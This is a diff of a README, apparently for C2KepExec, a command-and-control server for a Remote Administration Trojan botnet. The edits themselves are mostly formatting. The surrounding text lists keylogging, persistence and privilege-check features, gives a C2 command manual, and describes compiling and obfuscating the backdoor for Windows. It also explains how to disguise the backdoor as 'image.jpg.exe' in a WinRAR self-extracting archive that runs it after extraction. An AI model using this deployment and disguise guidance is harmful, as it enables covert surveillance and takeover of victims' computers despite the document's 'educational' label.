@@ -1,11 +1,11 @@
 # C2KepExec
 
-C2KepExec is a Command and Control (C2) server which can control multiple machines running the Remote Administration Trojan (RAT) forming a botnet cluster which was written in Python3. 
+C2KepExec is a Command and Control (C2) server which can control multiple machines running the Remote Administration Trojan (RAT) forming a botnet cluster which was written in Python3, C++, and C. 
 
 C2KepExec was developed for **educational** purposes and continues to be developed as such!
 
 
-# Features
+## Features
 
 - Integrated keylogger written as a class
   - Can be started and stopped remotely
@@ -25,7 +25,7 @@ C2KepExec was developed for **educational** purposes and continues to be develop
 - Remote shutdown of the backdoor _(executable is NOT safely removed)_
 
 
-# Table of Contents  
+## Table of Contents  
 - [Usage Manuals](#usage-manuals)
   - [C2 Manual](#c2-manual)
   - [Session Manual](#session-manual)
@@ -47,8 +47,7 @@ C2KepExec was developed for **educational** purposes and continues to be develop
   - [Session Options](#session-options)
   - [Backgrounding and Killing Session](#backgrounding-and-killing-session)
 
-# Usage Manuals
-## C2 Manual
+## Usage Manuals C2
 
     targets                 --> Prints Active Sessions
     session *session num*   --> Will Connect To Session (background to return)
@@ -82,7 +81,7 @@ C2KepExec was developed for **educational** purposes and continues to be develop
                                             example: persistence Backdoor windows32.exe
     check                               --> Check If Has Administrator Privileges
 
-# Dependencies
+## Dependencies
 
 The C2 server has no _external dependencies_ as of _v0.9.2-alpha_.
 
@@ -100,10 +99,10 @@ The backdoor relies on the following as of v0.10.1-alpha:
 The below mentioned steps are for compiling the backdoor for deployment. 
 For those wishing to test the C2 server and backdoor interaction see [issue 1](https://github.com/pxcs/C2KepExec/issues/1#issuecomment-1210378473).
 
-# Wine and Pyinstaller (Win version) Installation on Linux
+## Wine and Pyinstaller (Win version) Installation on Linux
 
 
-Python 2.7.14 Releases: https://www.python.org/downloads/release/python-2714/
+Python 2.7.14 Releases [here](https://www.python.org/downloads/release/python-2714/)
 
 ## Environment Setup
 
@@ -132,7 +131,7 @@ Python 2.7.14 Releases: https://www.python.org/downloads/release/python-2714/
 				    pynput
 
 
-# Backdoor Compilation and Obfuscation for Windows
+## Backdoor Compilation and Obfuscation for Windows
 
 ## Compile to Executable using Pyinstaller Linux
 
@@ -187,7 +186,7 @@ WinRAR > Add To Archive (image.jpg and backdoor.exe)
 Rename archive to: _image.jpg.exe_
 
 
--Add to SFX Archive (Y) and Advanced>
+- Add to SFX Archive (Y) and Advanced>
 
     **Setup>Run after extraction**
     
